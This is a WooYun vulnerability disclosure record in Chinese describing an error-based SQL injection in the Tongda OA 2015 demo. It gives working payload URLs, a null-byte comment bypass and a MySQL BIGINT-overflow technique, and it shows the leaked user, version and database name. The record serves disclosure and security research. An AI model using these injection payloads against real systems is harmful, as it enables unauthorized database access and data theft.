{"id": 83411, "wybug_id": "wooyun-2015-0147931", "wybug_title": "通达Office Anywhere 2015集团版OA某处报错注入漏洞demo测试（报错技巧/需登陆）", "wybug_corp": "通达信科", "wybug_author": "goubuli", "wybug_date": "2015-10-20 10:03", "wybug_open_date": "2016-01-18 15:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-23：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向公众公开  简要描述： 此处虽然未过滤单引号，但是还是需要绕过过滤。涉及两个技巧~求首页~ 详细说明：  厂商：通达信科测试demo地址：**.**.**.**/注入地址：\n**.**.**.**/general/document/index.php/recv/register/register_for/?tid=&title=1参数title可注入\n我们加入单引号'\n**.**.**.**/general/document/index.php/recv/register/register_for/?tid=&title=1'\n\n\n返回：\n**.**.**.**/general/document/index.php/recv/register/register_for/?tid=&title=1'\n普通注入无效，也不能union，要么是被过滤了要么就是直接输出出错SQL语句，如：\n**.**.**.**/general/document/index.php/recv/register/register_for/?tid=&title=1' and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--\n\n\n其他过滤的地方不一一展示了构造技巧~技巧一：注释普通注释都被过滤如：\n--#/*\n这里采用一个技巧，直接用截断\n;%00\n技巧二：报错注入,利用MySQL特性普通的报错带入执行时，不能爆出信息，下面技巧可以爆出数据库信息：\n(!(select*from(select user())x)-~0)\n这里主要用到了MySQL的运算特性，造成整数溢出其中\n~0表示0的补数，是最大值\n\n\n其次\n!(select*from(select user())x)对查出来的结果进行运算\n用第一个结果减去一个超大数，导致溢出，报错！！！那么注入EXP为：\n**.**.**.**/general/document/index.php/recv/register/register_for/?tid=&title=1%' and (!(select*from(select user())x)-~0)>1;%00\n\n\n\nSQL语句执行错误#1690: BIGINT UNSIGNED value is out of range in '((not((select 'root@**.**.**.**' from dual))) - ~(0))'\n得到user：\nroot@**.**.**.**\n少了任何一部分都不成功同样，其他信息version：\n**.**.**.**/general/document/index.php/recv/register/register_for/?tid=&title=1%' and (!(select*from(select version())x)-~0)>1;%00\n\n\n\nSQL语句执行错误#1690: BIGINT UNSIGNED value is out of range in '((not((select '5.5.36-enterprise-commercial-advanced-log' from dual))) - ~(0))'\n数据库版本：\n5.5.36-enterprise-commercial-advanced-log\ndatabase：\n**.**.**.**/general/document/index.php/recv/register/register_for/?tid=&title=1%' and (!(select*from(select database())x)-~0)>1;%00\n\n\nSQL语句执行错误#1690: BIGINT UNSIGNED value is out of range in '((not((select 'td_oa' from dual))) - ~(0))'得到数据库：\ntd_oa\n   漏洞证明：  \n\n\n\n\n\n这个点同样可以采用盲注，如这样构造：<code>**.**.**.**/general/document/index.php/recv/register/register_for/?tid=&title=1%' and 1=1 and 'a%'='a</cod\n\ne>   修复方案：  过滤   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2015-10-20 15:12 厂商回复： 需要登录 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}